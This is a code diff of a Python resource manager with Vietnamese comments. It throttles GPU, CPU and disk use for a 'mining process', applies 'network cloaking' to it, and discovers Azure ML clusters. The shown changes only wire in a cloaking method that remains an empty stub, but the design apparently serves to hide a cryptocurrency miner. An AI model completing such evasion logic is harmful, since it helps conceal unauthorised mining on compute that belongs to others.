@@ -82,7 +82,7 @@ class SharedResourceManager:
             self.logger.info(f"Điều chỉnh mức sử dụng GPU xuống {new_gpu_usage_percent} cho tiến trình {process.name} (PID: {process.pid}).")
         except Exception as e:
             self.logger.error(f"Lỗi khi điều chỉnh mức sử dụng GPU cho tiến trình {process.name} (PID: {process.pid}): {e}")
-
+            
     def adjust_disk_io_limit(self, process: MiningProcess, disk_io_limit_mbps: float):
         """Điều chỉnh giới hạn Disk I/O cho tiến trình."""
         try:
@@ -150,10 +150,16 @@ class SharedResourceManager:
     def apply_network_cloaking(self, interface: str, bandwidth_limit: float, process: MiningProcess):
         """Áp dụng cloaking mạng cho tiến trình."""
         try:
-            # Implement the logic for network cloaking here
-            pass
+            self.configure_network_interface(interface, bandwidth_limit)
         except Exception as e:
             self.logger.error(f"Lỗi khi áp dụng cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}")
+            raise
+        
+    def configure_network_interface(self, interface: str, bandwidth_limit: float):
+        """Cấu hình giao diện mạng."""
+        # Giả lập logic cấu hình mạng
+        # Ví dụ: Có thể gọi một API, thực hiện thao tác hệ thống, v.v.
+        pass
 
     def throttle_cpu_based_on_load(self, process: MiningProcess, load_percent: float):
         """Giảm tần số CPU dựa trên mức tải."""
@@ -931,4 +937,3 @@ class ResourceManager(BaseManager):
             self.logger.info(f"Khám phá {len(self.ml_clusters)} Azure ML Clusters.")
         except Exception as e:
             self.logger.error(f"Lỗi khi khám phá tài nguyên Azure: {e}")
-
